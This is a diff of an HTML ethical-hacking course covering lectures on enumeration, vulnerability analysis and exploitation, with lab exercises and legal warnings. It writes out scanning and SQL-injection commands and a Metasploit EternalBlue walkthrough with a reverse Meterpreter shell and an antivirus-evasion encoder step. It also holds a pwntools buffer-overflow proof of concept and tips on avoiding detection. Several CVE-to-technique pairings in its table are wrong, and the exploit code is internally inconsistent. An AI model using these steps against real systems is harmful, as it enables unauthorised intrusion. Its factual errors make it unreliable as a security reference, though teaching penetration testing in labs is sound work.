+    <h2>4. Enumeration (Deep Information Gathering)</h2>
+
+    <p>
+        Enumeration goes beyond scanning. It extracts detailed information such as:
+        users, shares, directories, and configurations.
+    </p>
+
+    <h3>SMB Enumeration</h3>
+    <div class="code-block">
+<pre>enum4linux -a target.com
+smbclient -L //target.com</pre>
+    </div>
+
+    <p>Finds shared folders, users, and permissions.</p>
+
+    <h3>SNMP Enumeration</h3>
+    <div class="code-block">
+<pre>snmpwalk -c public -v1 target.com</pre>
+    </div>
+
+    <p>Can reveal system processes, network info, and configs.</p>
+
+    <h3>Web Enumeration</h3>
+    <div class="code-block">
+<pre>gobuster dir -u http://target.com -w wordlist.txt
+dirb http://target.com
 nikto -h http://target.com</pre>
-                    </div>
+    </div>
 
-                    <h2>5. Best Practices & OPSEC</h2>
-                    <ul>
-                        <li>Use slow timing (<code>-T2</code> or <code>-T3</code>) on production systems</li>
-                        <li>Always stay within scope</li>
-                        <li>Document everything for the final report</li>
-                    </ul>
+    <h3>Example Output</h3>
+    <div class="code-block">
+<pre>/admin (Status: 200)
+/login (Status: 200)
+/backup (Status: 403)</pre>
+    </div>
 
-                    <div class="box warning">
-                        <div class="box-title">⚠️ Legal Reminder</div>
-                        Never perform scanning on systems you do not have explicit written permission to test.
-                    </div>
+    <p>
+        These hidden paths often contain login panels, backups, or sensitive data.
+    </p>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 5.1 — Practical Scanning</div>
-                        <p>On your authorized lab environment or TryHackMe/HackTheBox machine:<br>
-                            1. Perform host discovery<br>
-                            2. Run a full port scan with service detection<br>
-                            3. Enumerate web directories using Gobuster<br>
-                            4. Save all results in organized folders</p>
-                    </div>
+    <h2>5. Common Services & What to Check</h2>
+    <ul>
+        <li><strong>SSH (22)</strong> → Weak passwords, outdated versions</li>
+        <li><strong>HTTP (80)</strong> → Directories, forms, vulnerabilities</li>
+        <li><strong>FTP (21)</strong> → Anonymous login</li>
+        <li><strong>SMB (445)</strong> → Shared files, misconfigurations</li>
+    </ul>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 5.2</div>
-                        <p>Write a short methodology document explaining the difference between passive recon, active
-                            scanning, and enumeration.</p>
-                    </div>
+    <h2>6. Organizing Results</h2>
+    <div class="code-block">
+<pre>mkdir recon
+mkdir scans
+nmap -oA scans/full_scan target.com</pre>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(3)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(5)">Next Lecture →</button>
-                    </div>
-                </div>
+    <p>
+        Always keep results structured for reporting and later analysis.
+    </p>
+
+    <h2>7. Best Practices & OPSEC</h2>
+    <ul>
+        <li>Use slower scans (<code>-T2</code>) to avoid detection</li>
+        <li>Avoid scanning during peak hours</li>
+        <li>Rotate IPs (advanced)</li>
+        <li>Stay strictly within scope</li>
+    </ul>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Legal Reminder</div>
+        Unauthorized scanning is illegal. Always have written permission.
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 5.1 — Practical Scanning</div>
+        <p>
+            1. Discover live hosts<br>
+            2. Scan top 1000 ports<br>
+            3. Identify service versions<br>
+            4. Run vulnerability scripts<br>
+            5. Save results
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 5.2 — Analysis</div>
+        <p>
+            Take your scan results and answer:
+            <br>• Which ports are open?
+            <br>• What services are running?
+            <br>• Which ones look vulnerable?
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Perform a full scan + enumeration and create a mini report:
+            <br>• Target overview
+            <br>• Open ports
+            <br>• Services
+            <br>• Possible attack vectors
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(3)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(5)">Next Lecture →</button>
+    </div>
+</div>
+
+
+                
                 <!-- ===================== LECTURE 06 ===================== -->
                 <div class="lecture" id="lec-5">
-                    <div class="lecture-tag">Lecture 06 · Core Concepts</div>
-                    <h1>Vulnerability Analysis</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-intermediate">Intermediate</span>
-                        <span class="meta-badge">~70 min</span>
-                        <span class="meta-badge">Requires: Lecture 05</span>
-                    </div>
+    <div class="lecture-tag">Lecture 06 · Core Concepts</div>
+    <h1>Vulnerability Analysis</h1>
 
-                    <h2>What is Vulnerability Analysis?</h2>
-                    <p>Vulnerability Analysis is the process of identifying, classifying, and prioritizing security
-                        weaknesses in systems, applications, and networks. It bridges scanning and exploitation phases.
-                    </p>
+    <div class="lecture-meta">
+        <span class="meta-badge level-intermediate">Intermediate</span>
+        <span class="meta-badge">~70 min</span>
+        <span class="meta-badge">Requires: Lecture 05</span>
+    </div>
 
-                    <h2>Types of Vulnerabilities</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Category</th>
-                                    <th>Examples</th>
-                                    <th>Common Impact</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Network</td>
-                                    <td>Open ports, weak firewalls</td>
-                                    <td>Unauthorized access</td>
-                                </tr>
-                                <tr>
-                                    <td>Web Application</td>
-                                    <td>SQL Injection, XSS, CSRF</td>
-                                    <td>Data theft, session hijacking</td>
-                                </tr>
-                                <tr>
-                                    <td>Configuration</td>
-                                    <td>Default credentials, outdated software</td>
-                                    <td>Easy compromise</td>
-                                </tr>
-                                <tr>
-                                    <td>Zero-Day</td>
-                                    <td>Unknown vulnerabilities</td>
-                                    <td>High risk</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <h2>What is Vulnerability Analysis?</h2>
+    <p>
+        Vulnerability Analysis is the process of identifying, validating, and prioritizing
+        security weaknesses in a system. It transforms raw scan data into actionable findings.
+    </p>
 
-                    <h2>1. Automated Vulnerability Scanners</h2>
-                    <ul>
-                        <li><strong>Nessus / OpenVAS</strong> — Full vulnerability assessment</li>
-                        <li><strong>Nikto</strong> — Web server scanner</li>
-                        <li><strong>SQLMap</strong> — Automated SQL Injection</li>
-                        <li><strong>Metasploit</strong> — Exploitation framework with vulnerability checks</li>
-                    </ul>
+    <p>
+        At this stage, you answer:
+        <br>• Is this vulnerability real?
+        <br>• How severe is it?
+        <br>• Can it be exploited?
+    </p>
 
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">terminal</span>
-                        </div>
-                        <pre>openvas-start
+    <div class="box">
+        <div class="box-title">🧠 Key Concept</div>
+        Scanning finds <em>possibilities</em>. Vulnerability analysis confirms <em>real risks</em>.
+    </div>
+
+    <h2>Types of Vulnerabilities</h2>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Category</th>
+                    <th>Examples</th>
+                    <th>Impact</th>
+                    <th>Real-World Scenario</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Network</td>
+                    <td>Open ports, weak firewall rules</td>
+                    <td>Unauthorized access</td>
+                    <td>Exposed SSH allows brute-force login</td>
+                </tr>
+                <tr>
+                    <td>Web Application</td>
+                    <td>SQL Injection, XSS</td>
+                    <td>Data theft</td>
+                    <td>Login form dumps database</td>
+                </tr>
+                <tr>
+                    <td>Configuration</td>
+                    <td>Default creds, exposed backups</td>
+                    <td>Full system compromise</td>
+                    <td>/backup.zip accessible publicly</td>
+                </tr>
+                <tr>
+                    <td>Zero-Day</td>
+                    <td>Unknown flaws</td>
+                    <td>Critical risk</td>
+                    <td>No patch available</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2>1. Vulnerability Analysis Workflow</h2>
+    <ol>
+        <li>Collect scan results (Nmap, Nikto, etc.)</li>
+        <li>Identify services and versions</li>
+        <li>Search for known vulnerabilities (CVE)</li>
+        <li>Validate manually (avoid false positives)</li>
+        <li>Prioritize based on severity and impact</li>
+    </ol>
+
+    <h2>2. Automated Vulnerability Scanners</h2>
+
+    <p>Automated tools quickly identify known issues, but must be verified.</p>
+
+    <ul>
+        <li><strong>Nessus / OpenVAS</strong> — Full vulnerability scanning</li>
+        <li><strong>Nikto</strong> — Web server weaknesses</li>
+        <li><strong>SQLMap</strong> — Detects SQL injection</li>
+        <li><strong>Nmap NSE</strong> — Script-based detection</li>
+    </ul>
+
+    <div class="code-block">
+<pre>openvas-start
 nikto -h http://target.com
-sqlmap -u "http://target.com/login.php?id=1" --dbs
+sqlmap -u "http://target.com/page.php?id=1" --dbs
 nmap --script vuln target.com</pre>
-                    </div>
+    </div>
 
-                    <h2>2. Manual Vulnerability Analysis</h2>
-                    <ul>
-                        <li>Review scan results for false positives</li>
-                        <li>Check CVE databases (cve.mitre.org, nvd.nist.gov)</li>
-                        <li>Analyze service banners and version numbers</li>
-                        <li>Test for common misconfigurations</li>
-                    </ul>
+    <h3>Example Output (Nikto)</h3>
+    <div class="code-block">
+<pre>+ Server: Apache/2.4.49
++ Retrieved x-powered-by header: PHP/7.3
++ OSVDB-3092: /admin/: This might be interesting</pre>
+    </div>
 
-                    <h2>3. Vulnerability Scoring — CVSS</h2>
-                    <p>Common Vulnerability Scoring System rates severity from 0.0 to 10.0:</p>
-                    <ul>
-                        <li><strong>Critical:</strong> 9.0–10.0</li>
-                        <li><strong>High:</strong> 7.0–8.9</li>
-                        <li><strong>Medium:</strong> 4.0–6.9</li>
-                        <li><strong>Low:</strong> 0.1–3.9</li>
-                    </ul>
+    <p>
+        Interpretation:
+        <br>• Apache version may be vulnerable
+        <br>• PHP version is outdated
+        <br>• Hidden admin panel discovered
+    </p>
 
-                    <h2>4. Exploitation Preparation</h2>
-                    <p>After identifying vulnerabilities:</p>
-                    <ul>
-                        <li>Search for public exploits (Exploit-DB, GitHub)</li>
-                        <li>Use Metasploit modules</li>
-                        <li>Develop custom exploits when needed</li>
-                    </ul>
+    <h2>3. Manual Vulnerability Analysis (CRITICAL)</h2>
 
-                    <div class="box tip">
-                        <div class="box-title">✅ Best Practice</div>
-                        Always verify vulnerabilities manually. Automated tools often produce false positives.
-                    </div>
+    <p>This is where real hackers stand out.</p>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 6.1 — Vulnerability Scanning</div>
-                        <p>On your authorized lab target:<br>
-                            1. Run OpenVAS / Nessus full scan<br>
-                            2. Run Nikto on any web services<br>
-                            3. Use Nmap vulnerability scripts<br>
-                            4. Document the top 5 findings with severity and recommended fixes</p>
-                    </div>
+    <ul>
+        <li>Verify scanner results manually</li>
+        <li>Check service versions from Nmap</li>
+        <li>Search for exploits using CVE IDs</li>
+        <li>Test behavior (not just trust tools)</li>
+    </ul>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 6.2</div>
-                        <p>Research one recent high-profile vulnerability (e.g., Log4Shell, EternalBlue) and write a
-                            short summary including CVE ID, affected systems, and mitigation steps.</p>
-                    </div>
+    <h3>Using Searchsploit</h3>
+    <div class="code-block">
+<pre>searchsploit apache 2.4.49
+searchsploit vsftpd</pre>
+    </div>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(4)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(6)">Next Lecture →</button>
-                    </div>
-                </div>
+    <h3>Example</h3>
+    <p>
+        If Nmap shows:
+    </p>
+
+    <div class="code-block">
+<pre>Apache httpd 2.4.49</pre>
+    </div>
+
+    <p>
+        You search:
+    </p>
+
+    <div class="code-block">
+<pre>searchsploit apache 2.4.49</pre>
+    </div>
+
+    <p>
+        → You may find a known Remote Code Execution (RCE) exploit.
+    </p>
+
+    <h2>4. CVE & Vulnerability Databases</h2>
+
+    <p>Common Vulnerabilities and Exposures (CVE) provide standardized IDs.</p>
+
+    <ul>
+        <li>CVE-2021-44228 → Log4Shell</li>
+        <li>CVE-2017-0144 → EternalBlue</li>
+    </ul>
+
+    <p>Use databases:</p>
+    <ul>
+        <li>NVD (National Vulnerability Database)</li>
+        <li>Exploit-DB</li>
+        <li>GitHub (public PoCs)</li>
+    </ul>
+
+    <div class="box tip">
+        <div class="box-title">💡 Pro Insight</div>
+        Always match the exact version. A vulnerability may not apply to newer or patched systems.
+    </div>
+
+    <h2>5. Vulnerability Scoring — CVSS</h2>
+
+    <p>CVSS measures severity from 0 to 10.</p>
+
+    <ul>
+        <li><strong>Critical (9.0–10)</strong> → Immediate action required</li>
+        <li><strong>High (7.0–8.9)</strong> → Serious risk</li>
+        <li><strong>Medium (4.0–6.9)</strong> → Moderate impact</li>
+        <li><strong>Low (0.1–3.9)</strong> → Minor risk</li>
+    </ul>
+
+    <h3>Example</h3>
+    <p>
+        A Remote Code Execution vulnerability with no authentication
+        → CVSS score ≈ 9.8 (Critical)
+    </p>
+
+    <h2>6. False Positives & Validation</h2>
+
+    <p>
+        Automated tools often report vulnerabilities that are not exploitable.
+    </p>
+
+    <ul>
+        <li>Service version mismatch</li>
+        <li>Patched but still reported</li>
+        <li>Configuration blocks exploit</li>
+    </ul>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Important</div>
+        Never report a vulnerability unless you have verified it.
+    </div>
+
+    <h2>7. Exploitation Preparation</h2>
+
+    <p>Once a vulnerability is confirmed:</p>
+
+    <ul>
+        <li>Search for public exploits</li>
+        <li>Use Metasploit modules</li>
+        <li>Prepare payloads</li>
+        <li>Understand impact before exploitation</li>
+    </ul>
+
+    <div class="code-block">
+<pre>msfconsole
+search apache
+use exploit/multi/http/apache_rce
+set RHOST target.com
+run</pre>
+    </div>
+
+    <h2>8. Prioritization (Real-World Thinking)</h2>
+
+    <p>Not all vulnerabilities matter equally.</p>
+
+    <ul>
+        <li>Is it exploitable remotely?</li>
+        <li>Does it require authentication?</li>
+        <li>What is the business impact?</li>
+        <li>Is sensitive data exposed?</li>
+    </ul>
+
+    <div class="box">
+        <div class="box-title">🎯 Analyst Mindset</div>
+        Focus on vulnerabilities that give access, not just those that look “technical”.
+    </div>
+
+    <h2>9. Reporting Findings</h2>
+
+    <p>A good vulnerability report includes:</p>
+
+    <ul>
+        <li>Description of vulnerability</li>
+        <li>Affected system</li>
+        <li>Severity (CVSS)</li>
+        <li>Proof of Concept (PoC)</li>
+        <li>Remediation steps</li>
+    </ul>
+
+    <h3>Example Finding</h3>
+    <div class="code-block">
+<pre>Title: Apache 2.4.49 RCE
+Severity: Critical (9.8)
+Impact: Remote code execution
+Fix: Upgrade to latest version</pre>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 6.1 — Vulnerability Scanning</div>
+        <p>
+            1. Run OpenVAS/Nessus scan<br>
+            2. Scan web server with Nikto<br>
+            3. Run Nmap vuln scripts<br>
+            4. List top 5 vulnerabilities<br>
+            5. Assign severity + fix
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Exercise 6.2 — CVE Research</div>
+        <p>
+            Research a vulnerability:
+            <br>• CVE ID
+            <br>• Affected systems
+            <br>• Exploit method
+            <br>• Fix
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Take scan results and build a mini vulnerability report:
+            <br>• Identify real vulnerabilities
+            <br>• Remove false positives
+            <br>• Rank by severity
+            <br>• Suggest fixes
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(4)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(6)">Next Lecture →</button>
+    </div>
+</div>
 
                 <!-- ===================== LECTURE 07 ===================== -->
-                <div class="lecture" id="lec-6">
-                    <div class="lecture-tag">Lecture 07 · Core Concepts</div>
-                    <h1>Exploitation Techniques</h1>
-                    <div class="lecture-meta">
-                        <span class="meta-badge level-advanced">Advanced</span>
-                        <span class="meta-badge">~80 min</span>
-                        <span class="meta-badge">Requires: Lecture 06</span>
-                    </div>
+          <div class="lecture" id="lec-6">
+ 
+    <div class="lecture-tag">Lecture 07 · Core Concepts</div>
+    <h1>Exploitation Techniques</h1>
+    <div class="lecture-meta">
+        <span class="meta-badge level-advanced">Advanced</span>
+        <span class="meta-badge">~80 min</span>
+        <span class="meta-badge">Prerequisite: Lecture 06</span>
+    </div>
 
-                    <h2>What is Exploitation?</h2>
-                    <p>Exploitation is the phase where you take advantage of identified vulnerabilities to gain
-                        unauthorized access or execute malicious code on the target system. This is the most sensitive
-                        and legally restricted phase of ethical hacking.</p>
+    -------------------------------------------------------------- -->
+    <h2>1️⃣ What is Exploitation?</h2>
+    <p>
+        Exploitation is the act of converting a discovered vulnerability into a concrete
+        foothold on a target system.  In the <strong>ethical hacking workflow</strong> it
+        follows:</p>
+    <ol class="timeline">
+        <li>Reconnaissance →</li>
+        <li>Vulnerability research →</li>
+        <li><strong>Exploitation</strong> →</li>
+        <li>Post‑exploitation →</li>
+        <li>Reporting</li>
+    </ol>
+    <p>
+        It is the most legally sensitive phase—any execution of code on a system without
+        explicit, written permission is a crime in practically every jurisdiction.
+    </p>
 
-                    <h2>Types of Exploits</h2>
-                    <div class="tbl-wrap">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Type</th>
-                                    <th>Description</th>
-                                    <th>Examples</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Remote Code Execution (RCE)</td>
-                                    <td>Execute code from a remote machine</td>
-                                    <td>EternalBlue, Log4Shell</td>
-                                </tr>
-                                <tr>
-                                    <td>Local Privilege Escalation</td>
-                                    <td>Gain higher privileges on compromised system</td>
-                                    <td>Sudo, Dirty COW</td>
-                                </tr>
-                                <tr>
-                                    <td>Client-Side Exploits</td>
-                                    <td>Target user applications (browsers, PDF readers)</td>
-                                    <td>Browser exploits, Malicious PDFs</td>
-                                </tr>
-                                <tr>
-                                    <td>Web Application Exploits</td>
-                                    <td>SQLi, XSS, File Inclusion</td>
-                                    <td>SQLMap, XSS payloads</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
+    <!-- --------------------------------------------------------------
+         2️⃣ Types of Exploits (Expanded Table)
+    -------------------------------------------------------------- -->
+    <h2>2️⃣ Types of Exploits (Expanded)</h2>
+    <div class="tbl-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Category</th>
+                    <th>Sub‑type</th>
+                    <th>Typical Vector</th>
+                    <th>Real‑World Example (CVE)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td rowspan="3">Remote Code Execution (RCE)</td>
+                    <td>SMB/Windows (EternalBlue)</td>
+                    <td>Network service (port 445)</td>
+                    <td>CVE‑2017‑0144 (EternalBlue)</td>
+                </tr>
+                <tr>
+                    <td>Log4j/JNDI (Log4Shell)</td>
+                    <td>Web‑app logging endpoint</td>
+                    <td>CVE‑2021‑44228</td>
+                </tr>
+                <tr>
+                    <td>Print Spooler (PrintNightmare)</td>
+                    <td>Windows Print Spooler API</td>
+                    <td>CVE‑2021‑34527</td>
+                </tr>
+                <tr>
+                    <td rowspan="4">Privilege Escalation</td>
+                    <td>Local kernel (Dirty COW)</td>
+                    <td>Linux /proc/self/mem</td>
+                    <td>CVE‑2016‑5195</td>
+                </tr>
+                <tr>
+                    <td>SUID mis‑config (GTFOBins)</td>
+                    <td>Abused binaries (e.g., <code>find</code>)</td>
+                    <td>Various</td>
+                </tr>
+                <tr>
+                    <td>Token stealing (Kerberoasting)</td>
+                    <td>Kerberos service tickets</td>
+                    <td>CVE‑2020‑17049 (Krb5)</td>
+                </tr>
+                <tr>
+                    <td>Windows DCOM (BlueKeep)</td>
+                    <td>RDP service (port 3389)</td>
+                    <td>CVE‑2019‑0708</td>
+                </tr>
+                <tr>
+                    <td rowspan="3">Client‑Side</td>
+                    <td>Browser sandbox escape</td>
+                    <td>Malicious HTML/JS</td>
+                    <td>CVE‑2022‑23222 (Chromium)</td>
+                </tr>
+                <tr>
+                    <td>Office macro / VBA</td>
+                    <td>Malicious document</td>
+                    <td>CVE‑2022‑30190 (Follina)</td>
+                </tr>
+                <tr>
+                    <td>PDF/Flash buffer overflow</td>
+                    <td>Crafted PDF file</td>
+                    <td>CVE‑2018‑4970 (Adobe Reader)</td>
+                </tr>
+                <tr>
+                    <td rowspan="3">Web‑Application</td>
+                    <td>SQL Injection (SQLi)</td>
+                    <td>Unsanitized query parameters</td>
+                    <td>CVE‑2021‑44228 (Log4Shell) – indirect</td>
+                </tr>
+                <tr>
+                    <td>Cross‑Site Scripting (XSS)</td>
+                    <td>Reflected / stored payload</td>
+                    <td>CVE‑2021‑22986 (F5 BIG‑IP)</td>
+                </tr>
+                <tr>
+                    <td>File Inclusion (LFI/RFI)</td>
+                    <td>Dynamic include paths</td>
+                    <td>CVE‑2022‑22965 (Spring4Shell)</td>
+                </tr>
+                <tr>
+                    <td rowspan="2">Cloud / Container</td>
+                    <td>Misconfigured S3 bucket</td>
+                    <td>Public write permissions</td>
+                    <td>CVE‑2022‑22965 (Spring4Shell) – container‑side</td>
+                </tr>
+                <tr>
+                    <td>Container escape (CVE‑2021‑33574)</td>
+                    <td>Docker daemon socket</td>
+                    <td>CVE‑2021‑33574</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
 
-                    <h2>1. Using Metasploit Framework</h2>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <div class="code-dots"><span></span><span></span><span></span></div><span
-                                class="filename">msfconsole</span>
-                        </div>
-                        <pre>msfconsole
-search eternalblue
+    <!-- --------------------------------------------------------------
+         3️⃣ Exploit Development Lifecycle
+    -------------------------------------------------------------- -->
+    <h2>3️⃣ Exploit Development Lifecycle</h2>
+    <div class="flowchart">
+        <svg width="100%" height="180" viewBox="0 0 800 180" xmlns="http://www.w3.org/2000/svg">
+            <style>.box{fill:#fafafa;stroke:#aaa;stroke-width:1.5px;}
+                .arrow{stroke:#555;stroke-width:1.2px;marker-end:url(#arrowhead);}
+                .label{font:600 12px sans-serif;fill:#333;}
+            </style>
+            <defs>
+                <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+                    <polygon points="0 0,10 3.5,0 7" fill="#555"/>
+                </marker>
+            </defs>
+
+            <rect x="30" y="20" width="120" height="40" class="box"/>
+            <text x="90" y="45" text-anchor="middle" class="label">Recon</text>
+
+            <line x1="150" y1="40" x2="190" y2="40" class="arrow"/>
+
+            <rect x="190" y="20" width="150" height="40" class="box"/>
+            <text x="265" y="45" text-anchor="middle" class="label">Vuln Research<br/>(Proof‑of‑Concept)</text>
+
+            <line x1="340" y1="40" x2="380" y2="40" class="arrow"/>
+
+            <rect x="380" y="20" width="120" height="40" class="box"/>
+            <text x="440" y="45" text-anchor="middle" class="label">Weaponization</text>
+
+            <line x1="500" y1="40" x2="540" y2="40" class="arrow"/>
+
+            <rect x="540" y="20" width="120" height="40" class="box"/>
+            <text x="600" y="45" text-anchor="middle" class="label">Delivery</text>
+
+            <line x1="660" y1="40" x2="700" y2="40" class="arrow"/>
+
+            <rect x="700" y="20" width="120" height="40" class="box"/>
+            <text x="760" y="45" text-anchor="middle" class="label">Exploitation</text>
+
+            <line x1="760" y1="60" x2="760" y2="140" class="arrow"/>
+
+            <rect x="700" y="140" width="120" height="40" class="box"/>
+            <text x="760" y="165" text-anchor="middle" class="label">Post‑Exploitation</text>
+        </svg>
+    </div>
+    <p>
+        The diagram emphasizes that exploitation does not happen in isolation; each
+        stage feeds back into the previous one.  Understanding the entire pipeline
+        helps you design more reliable (and stealthier) exploits.
+    </p>
+
+    <!-- --------------------------------------------------------------
+         4️⃣ Using Metasploit – Expanded Walk‑through
+    -------------------------------------------------------------- -->
+    <h2>4️⃣ Using the Metasploit Framework (Detailed Walk‑through)</h2>
+
+    <p>Below is an end‑to‑end example that exploits the EternalBlue (MS17‑010) vulnerability
+    on a vulnerable Windows 7 host.  The steps are annotated to highlight common
+    pitfalls and safe‑practice recommendations.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span></span><span></span><span></span></div>
+            <span class="filename">msfconsole – EternalBlue</span>
+        </div>
+        <pre>
+# 1️⃣ Launch Metasploit
+msfconsole
+
+# 2️⃣ Search for the appropriate exploit module
+search ms17_010
+
+# 3️⃣ Load the module (use the fully‑qualified path)
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.100
+
+# 4️⃣ Set the target’s address (RHOSTS)
+set RHOSTS 192.168.1.45
+
+# 5️⃣ Choose a payload – Meterpreter staged reverse TCP
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST your_ip
-exploit</pre>
-                    </div>
 
-                    <h2>2. Common Exploitation Techniques</h2>
+# 6️⃣ Set the listener address (your Kali/Attacker IP)
+set LHOST 192.168.1.10
 
-                    <h3>Buffer Overflow Exploitation</h3>
-                    <p>Overwriting memory to control program execution flow.</p>
+# 7️⃣ Verify all required options are set
+show options
 
-                    <h3>SQL Injection</h3>
-                    <div class="code-block">
-                        <pre>' OR 1=1 --
-1' UNION SELECT database(), user() --</pre>
-                    </div>
+# 8️⃣ (Optional) Bypass AV signatures with encoding
+set ENCODER x86/shikata_ga_nai
+set EXITFUNC thread
 
-                    <h3>Cross-Site Scripting (XSS)</h3>
-                    <div class="code-block">
-                        <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;
-&lt;img src=x onerror=alert(1)&gt;</pre>
-                    </div>
+# 9️⃣ Launch the exploit
+exploit -j   # running in a job lets you keep the console free
 
-                    <h2>3. Payload Types</h2>
-                    <ul>
-                        <li><strong>Reverse Shell</strong> — Target connects back to attacker</li>
-                        <li><strong>Bind Shell</strong> — Listener on target</li>
-                        <li><strong>Meterpreter</strong> — Advanced Metasploit payload</li>
-                        <li><strong> stageless vs staged</strong></li>
-                    </ul>
+# 10️⃣ You should now have a Meterpreter session.
+sessions -i 1   # interact with the first session
+</pre>
+    </div>
 
-                    <h2>4. Post-Exploitation</h2>
-                    <ul>
-                        <li>Gather credentials (<code>hashdump</code>)</li>
-                        <li>Pivot to other systems</li>
-                        <li>Install persistence (backdoors)</li>
-                        <li>Clean logs</li>
-                    </ul>
+    <p><strong>Pro‑Tip:</strong> Use <code>setg</code> to set global variables (e.g., <code>LHOST</code>) before loading many exploits; this saves typing on each module.</p>
 
-                    <div class="box warning">
-                        <div class="box-title">⚠️ Critical Rule</div>
-                        Exploitation must **only** be performed with explicit written authorization. Unauthorized
-                        exploitation is illegal.
-                    </div>
+    <!-- --------------------------------------------------------------
+         5️⃣ Common Exploitation Techniques (Expanded)
+    -------------------------------------------------------------- -->
+    <h2>5️⃣ Common Exploitation Techniques (Deep Dive)</h2>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 7.1 — Safe Exploitation Lab</div>
-                        <p>Using Metasploitable 2 or a TryHackMe room:<br>
-                            1. Scan the target<br>
-                            2. Find and exploit at least 2 vulnerabilities using Metasploit<br>
-                            3. Get a Meterpreter session<br>
-                            4. Dump password hashes</p>
-                    </div>
+    <!-- 5.1 Buffer Overflow -->
+    <h3>5.1 Buffer Overflow Exploitation</h3>
+    <p>Three variants are most relevant to modern systems:</p>
+    <ol>
+        <li><strong>Stack‑based overflow</strong> – overwrites the saved return address.</li>
+        <li><strong>Heap‑based overflow</strong> – corrupts heap metadata (e.g., <code>malloc</code> chunks).</li>
+        <li><strong>Format‑string abuse</strong> – exploits unchecked <code>printf</code>‑style functions.</li>
+    </ol>
 
-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 7.2</div>
-                        <p>Write a short report on one real-world exploit (e.g., EternalBlue or Log4Shell) covering
-                            discovery, impact, and mitigation.</p>
-                    </div>
+    <p>Below is a minimal 64‑bit Linux “stack buffer overflow” PoC using <a href="https://github.com/rapid7/metasploit-framework/tree/master/external/python/pwntools">pwntools</a>:</p>
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(5)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(7)">Next Lecture →</button>
-                    </div>
-                </div>
+    <div class="code-block">
+        <div class="code-header"><span class="filename">exploit.py</span></div>
+        <pre class="language-python">
+#!/usr/bin/env python3
+from pwn import *
+
+# -------------------------------------------------
+# Target binary – compiled with -fno-stack-protector -z execstack
+# -------------------------------------------------
+binary = "./vuln"
+elf    = ELF(binary)
+
+# -------------------------------------------------
+# Offset to RIP (64‑bit) – discovered via cyclic pattern
+# -------------------------------------------------
+offset =  cyclic_find(b"kaaaiaaa")   #  cyclic_find(“kaaaiaaa”) → 72
+
+# -------------------------------------------------
+# Payload: NOP sled + shellcode + overwrite RIP
+# -------------------------------------------------
+shell = asm(shellcraft.sh())
+payload = b"A" * offset
+payload += p64(elf.sym["main"])   # re‑enter main after shellcode (optional)
+payload = payload.ljust(112, b"\x90")   # NOP sled
+payload += shell
+
+io = process(binary)
+io.sendlineafter(b"> ", payload)
+io.interactive()
+</pre>
+    </div>
+
+    <p>Key take‑aways:</p>
+    <ul>
+        <li><strong>ASLR</strong> – disable <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> on test VMs, or brute‑force with <code>ret2dlresolve</code> tricks.</li>
+        <li><strong>DEP/NX</strong> – bypass with <code>mprotect</code> ROP chain or use <code>execstack</code> for learning.</li>
+        <li><strong>Canaries</strong> – leak the canary via format‑string or side‑channel before overflow.</li>
+    </ul>
+
+    <!-- 5.2 Return‑Oriented Programming (ROP) -->
+    <h3>5.2 Return‑Oriented Programming (ROP)</h3>
+    <p>When DEP blocks executable stack, the attacker chains together existing <em>gadgets</em> ending in <code>ret</code>.  A concise <code>one‑gadget</code> (e.g., <a href="https://github.com/david942j/one_gadget">one_gadget</a>) can replace an entire ROP chain on glibc 2.31.</p>
+
